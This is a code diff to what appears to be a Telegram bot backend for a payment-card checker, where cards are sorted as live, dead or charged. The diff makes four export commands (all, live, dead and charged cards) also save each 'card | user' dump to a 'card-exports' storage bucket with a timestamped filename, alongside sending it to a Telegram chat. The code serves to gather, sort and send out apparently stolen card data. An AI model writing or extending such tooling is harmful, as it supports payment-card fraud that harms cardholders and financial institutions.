@@ -5345,13 +5345,26 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
         const user = userMap.get(c.user_id) || c.user_id || "Unknown";
         return `${c.card_details || "Unknown"} | ${user}`;
       }).join("\n");
-      const filename = `all_cards_${new Date().toISOString().split("T")[0]}.txt`;
+      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+      const filename = `all_cards_${timestamp}.txt`;
+
+      // Save to storage bucket
+      const { error: uploadError } = await supabase.storage
+        .from("card-exports")
+        .upload(`allcards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
+          contentType: "text/plain",
+          upsert: true
+        });
+
+      if (uploadError) {
+        console.error("Storage upload error:", uploadError);
+      }
 
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📁 <b>All Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards\n\n<i>Format: card | user</i>`
+        `📁 <b>All Cards Export</b>\n\n✅ Live: ${liveCount}\n❌ Dead: ${deadCount}\n❓ Unknown: ${unknownCount}\n\n📊 Total: ${cards.length} cards\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: allcards/${filename}</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
@@ -5402,13 +5415,26 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
         const user = userMap.get(c.user_id) || c.user_id || "Unknown";
         return `${c.card_details || "Unknown"} | ${user}`;
       }).join("\n");
-      const filename = `live_cards_${new Date().toISOString().split("T")[0]}.txt`;
+      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+      const filename = `live_cards_${timestamp}.txt`;
+
+      // Save to storage bucket
+      const { error: uploadError } = await supabase.storage
+        .from("card-exports")
+        .upload(`livecards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
+          contentType: "text/plain",
+          upsert: true
+        });
+
+      if (uploadError) {
+        console.error("Storage upload error:", uploadError);
+      }
 
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📁 <b>Live Cards Export</b>\n\n✅ Total Live Cards: ${cards.length}\n\n<i>Format: card | user</i>`
+        `📁 <b>Live Cards Export</b>\n\n✅ Total Live Cards: ${cards.length}\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: livecards/${filename}</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
@@ -5459,13 +5485,26 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
         const user = userMap.get(c.user_id) || c.user_id || "Unknown";
         return `${c.card_details || "Unknown"} | ${user}`;
       }).join("\n");
-      const filename = `dead_cards_${new Date().toISOString().split("T")[0]}.txt`;
+      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+      const filename = `dead_cards_${timestamp}.txt`;
+
+      // Save to storage bucket
+      const { error: uploadError } = await supabase.storage
+        .from("card-exports")
+        .upload(`deadcards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
+          contentType: "text/plain",
+          upsert: true
+        });
+
+      if (uploadError) {
+        console.error("Storage upload error:", uploadError);
+      }
 
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📁 <b>Dead Cards Export</b>\n\n❌ Total Dead Cards: ${cards.length}\n\n<i>Format: card | user</i>`
+        `📁 <b>Dead Cards Export</b>\n\n❌ Total Dead Cards: ${cards.length}\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: deadcards/${filename}</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
@@ -5516,13 +5555,26 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
         const user = userMap.get(c.user_id) || c.user_id || "Unknown";
         return `${c.card_details || "Unknown"} | ${user}`;
       }).join("\n");
-      const filename = `charged_cards_${new Date().toISOString().split("T")[0]}.txt`;
+      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+      const filename = `charged_cards_${timestamp}.txt`;
+
+      // Save to storage bucket
+      const { error: uploadError } = await supabase.storage
+        .from("card-exports")
+        .upload(`chargedcards/${filename}`, new Blob([fileContent], { type: "text/plain" }), {
+          contentType: "text/plain",
+          upsert: true
+        });
+
+      if (uploadError) {
+        console.error("Storage upload error:", uploadError);
+      }
 
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📁 <b>Charged Cards Export</b>\n\n💳 Total Charged Cards: ${cards.length}\n\n<i>Format: card | user</i>`
+        `📁 <b>Charged Cards Export</b>\n\n💳 Total Charged Cards: ${cards.length}\n\n<i>Format: card | user</i>\n\n💾 <i>Saved to storage: chargedcards/${filename}</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
